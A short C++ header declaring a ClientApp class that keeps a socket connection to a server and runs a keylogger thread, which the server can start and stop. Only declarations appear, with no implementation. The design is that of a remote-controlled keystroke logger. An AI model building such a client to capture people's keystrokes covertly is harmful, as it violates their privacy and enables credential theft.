#pragma once

#include <thread>
#include <atomic>
#include <memory>
#include <vector>
#include <string>
#include "../utils/LPTF/LPTF_Socket.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"
#include "../utils/LPTF/LPTF_PacketType.hpp"
#include "../utils/SystemInfo/KeyLogger.hpp"

class ClientApp
{
public:
    ClientApp();
    ~ClientApp();

    // Interdit la copie, autorise le move (form canonique de Coplien)
    ClientApp(const ClientApp&) = delete;
    ClientApp& operator=(const ClientApp&) = delete;
    ClientApp(ClientApp&&) noexcept = default;
    ClientApp& operator=(ClientApp&&) noexcept = default;

    void run();

private:
    void serverRequestHandler();
    void startKeylogger();
    void stopKeylogger(const LPTF_Packet& packet);

    std::atomic<bool> running {true};
    std::unique_ptr<LPTF_Socket> socket;
    std::unique_ptr<KeyLogger> keyLogger;
    std::thread keylogThread;
    std::thread serverThread;
};
